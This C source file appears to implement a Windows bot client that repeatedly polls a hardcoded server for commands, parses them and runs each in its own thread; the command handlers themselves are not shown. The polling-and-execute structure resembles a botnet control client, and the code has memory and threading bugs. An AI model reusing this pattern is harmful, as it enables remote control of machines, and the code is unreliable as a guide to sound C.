#include "nn_bot.h"

#define RECV_BUF_SZ 16384
void bot_startup(char *host, unsigned long request_time)
{
    SSL_CTX *ssl_ctx = NULL;
    https_conn_t https;
    int r = 0;
    char request[1024];
    char recv_buf[RECV_BUF_SZ];
    unsigned long long timer;

    printf("Initializing bot...\n");

    init_ssl();

    ssl_ctx = SSL_CTX_new(SSLv23_client_method());
    r = new_https(host, ssl_ctx, &https);
    if(r == -1)
    {
        fatalOSSL("while connecting to server", ERR_get_error());
        SSL_CTX_free(ssl_ctx);
        return;
    }

    init_requests();

    /*** Mutex ***/
    mx_requests = PTHREAD_MUTEX_INITIALIZER;
    mx_req_count = PTHREAD_MUTEX_INITIALIZER;
    mx_req_threads = PTHREAD_MUTEX_INITIALIZER;
    mx_bot_id = PTHREAD_MUTEX_INITIALIZER;
    mx_req_queue = PTHREAD_MUTEX_INITIALIZER;

    /*** Request queue ***/
    init_array(&req_queue, 8, sizeof(DATA));

    /*** Request threads ***/
    int i;
    for(i = 0; i<MAX_REQ_THREADS; i++)
    {
        req_threads[i]._id = -1;
    }

    /*** Connection to server ***/
    bot_id = 5;

    printf("All is initialized, connecting to server...\n");
    strcpy(request, "GET /bot.php?id=5 HTTP/1.0\r\n");
    strcat(request, "Host: nonameufr.alwaysdata.net\r\n");
    strcat(request, "User-Agent: NN2 Windows\r\n");
    strcat(request, "\r\n");

    printf("Waiting for requests...\n");
    timer = current_time_millis();
    int rsize;
    while(1)
    {
        if((current_time_millis() - timer) > request_time)
        {
            timer = current_time_millis();

            rsize = https_request(&https, request, strlen(request), recv_buf, RECV_BUF_SZ);
            if(rsize <= 0)
            {
                continue;
            }

            recv_buf[rsize] = 0;

            //printf("Received : %s\n\n", recv_buf);
            r = analyse_recv(recv_buf, rsize);
        }
        check_queue();
        Sleep(50);
    }

    https_close(&https);
    SSL_CTX_free(ssl_ctx);
}

void bot_cleanup(char *host)
{
    SSL_CTX *ssl_ctx = NULL;
    https_conn_t https;
    char request[1024];
    int r;

    printf("Terminating bot...");
    init_ssl();

    ssl_ctx = SSL_CTX_new(SSLv23_client_method());
    r = new_https(host, ssl_ctx, &https);
    if(r == -1)
    {
        fatalOSSL("while disconnecting from server", ERR_get_error());
        SSL_CTX_free(ssl_ctx);
        return;
    }

    sprintf(request, "GET /connect.php?r=disconnect&id=%d HTTP/1.0\r\n", bot_id);
    strcat(request, "Host: nonameufr.alwaysdata.net\r\n");
    strcat(request, "User-Agent: NN2 Windows\r\n");
    strcat(request, "\r\n");

    printf("Sending disconnection signal to server...");
    //Send disconnection request

    int st_req_count = get_req_count();
    if(st_req_count != 0)
    {
        printf("%d requests still running... (waiting 10 seconds for the requests to end)\n", st_req_count);
        unsigned long long timer = current_time_millis();
        while(1)
        {
            if(current_time_millis() - timer > 10000)
            {
                int i;
                for(i = 0; i<MAX_REQ_THREADS; i++)
                {
                    pthread_mutex_lock(&mx_req_threads);
                    if(req_threads[i]._id != -1)
                    {
                        int j;
                        for(j = 0; j<req_threads[i]._argc; j++)
                        {
                            free(req_threads[i]._argv[i]);
                        }
                    }
                    pthread_mutex_unlock(&mx_req_threads);
                }
                break;
            }
            if(get_req_count() == 0)
            {
                break;
            }
            Sleep(50);
        }
    }

    /*** Mutex ***/
    pthread_mutex_destroy(&mx_bot_id);
    pthread_mutex_destroy(&mx_requests);
    pthread_mutex_destroy(&mx_req_count);
    pthread_mutex_destroy(&mx_req_queue);
    pthread_mutex_destroy(&mx_req_threads);

    /*** Request queue ***/
    if(req_queue.length != 0)
    {
        int i;
        for(i = 0; i<req_queue.length; i++)
        {
            nn_req_data_t data;
            get_item_data(&req_queue, i, &data);
            int j;
            for(j = 0; j<data._argc; j++)
            {
                free((void *) data._argv[i]);
            }
        }
    }
    free_array(&req_queue);

    /*** Releasing connection data ***/
    https_close(&https);
    SSL_CTX_free(ssl_ctx);

    printf("Terminated.\n");
}

/*********
*** -2 -> Exit signal
***  0 -> Requests executed without problems
***  1 -> No requests
*********/
int analyse_recv(char *recv_buf, size_t recv_sz)
{
    char *header;
    char *content;
    char *token;
    char buffer[1024];

    int i;
    for(i = 0; i<recv_sz; i++)
    {
        if(recv_sz > i+3)
        {
            if(recv_buf[i] == '\r' && recv_buf[i+1] == '\n' && recv_buf[i+2] == '\r' && recv_buf[i+3] == '\n')
            {
                recv_buf[i] = 0;
                header = recv_buf;
                content = header+(i+4);
                break;
            }
        } else
        {
            printf("%d - %d\n", recv_sz, i);
            header = recv_buf;
            content = NULL;
            break;
        }
    }

    //printf("Content : %s\n", content);

    if(startwith("no-request", content) == 0)
    {
        return 1;
    }
    if(startwith("error", content) == 0)
    {
        fprintf(stderr, "\tServer error (raw=\"%s\").\n", content);
        return -1;
    }

    int requests = occurences(content, "\3");
    token = split(content, '\3');
    for(i = 0; i<requests; i++)
    {
        //printf("Request %d : %s\n", i, token);
        char *params[32];
        int params_count;

        strcpy(buffer, token);
        parse_recv(buffer, params, &params_count);

        strcpy(buffer, token);
        start_request(splits(buffer, "\\\\"), params, params_count);
        token = split(token + strlen(token) + 1, '\3');
    }

    return 0;
}

void start_request(char *req, char **params, int params_count)
{
    int index = -1;
    int i;

    pthread_mutex_lock(&mx_req_threads);
    for(i = 0; i<MAX_REQ_THREADS; i++)
    {
        if(req_threads[i]._id == -1)
        {
            index = i;
            break;
        }
    }

    if(index == -1)
    {
        printf("Limit of requests reached, adding to queue.\n");

        pthread_mutex_unlock(&mx_req_threads);

        nn_req_data_t data;
        data._id = -4;
        data._argc = params_count;
        strcpy(data._req, req);
        for(i = 0; i<params_count; i++)
        {
            data._argv[i] = params[i];
        }

        pthread_mutex_lock(&mx_req_queue);
        push_item_data(&req_queue, data);
        pthread_mutex_unlock(&mx_req_queue);
        return;
    }

    req_threads[index]._id = index;

    strcpy(req_threads[index]._req, req);
    req_threads[index]._argc = params_count;
    for(i = 0; i<params_count; i++)
    {
        req_threads[index]._argv[i] = params[i];
    }

    pthread_t th;
    if(pthread_create(&th, NULL, request_thread_func, &(req_threads[index])) != 0)
    {
        fprintf(stderr, "[!!] Error : couldn't create thread for that request ! (adding requet to queue)\n");
        req_threads[index]._id = -1;
        pthread_mutex_unlock(&mx_req_threads);

        nn_req_data_t data;
        data._id = -4;
        data._argc = params_count;
        strcpy(data._req, req);
        for(i = 0; i<params_count; i++)
        {
            data._argv[i] = params[i];
        }

        pthread_mutex_lock(&mx_req_queue);
        push_item_data(&req_queue, data);
        pthread_mutex_unlock(&mx_req_queue);
        return;
    }
    req_threads[index]._th = th;

    pthread_mutex_unlock(&mx_req_threads);

    inc_req_count();
}

void parse_recv(char *req, char **out_params, int *params_count)
{
    char *token;
    int params_nb = occurences(req, "\\\\");

    if(params_nb == 0)
    {
        *params_count = 0;
        return;
    }

    token = strtok(req, "\\\\");
    int i;
    for(i = 0; i<params_nb; i++)
    {
        token = strtok(NULL, "\\\\");
        char *param = (char *) malloc(strlen(token)+1);
        if(param == NULL)
        {
            fprintf(stderr, "[!!] Error : failed to allocate memory to store parameters. (parameter [%d] set to NULL)\n", i);
            out_params[i] = NULL;
            continue;
        }
        strcpy(param, token);
        out_params[i] = param;
    }

    *params_count = params_nb;
}

void check_queue()
{
    pthread_mutex_lock(&mx_req_queue);

    int st_req_count = get_req_count();
    if(req_queue.length > 0 && st_req_count < MAX_REQ_THREADS)
    {
        int new_potential_th = MAX_REQ_THREADS - st_req_count;
        int created_th = 0;

        int r;
        for(r = 0; r<req_queue.length; r++)
        {
            if(created_th > new_potential_th)
            {
                pthread_mutex_unlock(&mx_req_queue);
                break;
            }
            nn_req_data_t data;
            int ret = get_item_data(&req_queue, r, &data);
            pthread_mutex_unlock(&mx_req_queue);


            if(data._id != -4 || ret == -1)
            {
                continue;
            }

            int index;
            pthread_mutex_lock(&mx_req_threads);

            int i;
            for(i = 0; i<MAX_REQ_THREADS; i++)
            {
                if(req_threads[i]._id == -1)
                {
                    index = i;
                    break;
                }
            }
            req_threads[index]._id = index;

            strcpy(req_threads[index]._req, data._req);
            req_threads[index]._argc = data._argc;
            for(i = 0; i<data._argc; i++)
            {
                req_threads[index]._argv[i] = data._argv[i];
            }

            pthread_t th;
            if(pthread_create(&th, NULL, request_thread_func, &(req_threads[index])) != 0)
            {
                fprintf(stderr, "[!!] Error (in check_queue) : couldn't create new thread for that request. (request \"%s\" aborted until next check_queue)\n"
                        , data._req);
                req_threads[index]._id = -1;
                pthread_mutex_unlock(&mx_req_threads);
                return;
            }
            req_threads[index]._th = th;

            pthread_mutex_unlock(&mx_req_threads);

            inc_req_count();
            created_th++;

            pthread_mutex_lock(&mx_req_queue);
            req_queue._array[r]._data._id = -2;
            pthread_mutex_unlock(&mx_req_queue);
        }

        if(created_th == 0 && new_potential_th != 0)
        {
            req_queue.length = 0;
        }
    } else
    {
        pthread_mutex_unlock(&mx_req_queue);
    }
}

void *request_thread_func(void *arg)
{
    pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, NULL);

    nn_req_data_t *data = (nn_req_data_t *) arg;

    pthread_mutex_lock(&mx_req_threads);

    char *req = data->_req;
    char **argv = data->_argv;
    int argc = data->_argc;
    int id = data->_id;

    pthread_mutex_unlock(&mx_req_threads);

    int r = do_request(req, argv, argc);
    if(r == -1)
    {
        printf("\t(%d) no request found for \"%s\".\n", id, req);
    } else
    {
        printf("\t(%d) request \"%s\" terminated with code %d.\n", id, req, r);
    }

    /*** Thread ending ***/
    int i;
    for(i = 0; i<argc; i++)
    {
        pthread_mutex_lock(&mx_req_threads);
        free((void *) data->_argv[i]);
        pthread_mutex_unlock(&mx_req_threads);
    }
    data->_id = -1;

    dec_req_count();

    pthread_exit(NULL);
    return NULL;
}

unsigned int get_req_count()
{
    pthread_mutex_lock(&mx_req_count);
    unsigned int r = req_count;
    pthread_mutex_unlock(&mx_req_count);
    return r;
}
void inc_req_count()
{
    pthread_mutex_lock(&mx_req_count);
    req_count++;
    pthread_mutex_unlock(&mx_req_count);
}
void dec_req_count()
{
    pthread_mutex_lock(&mx_req_count);
    req_count--;
    pthread_mutex_unlock(&mx_req_count);
}
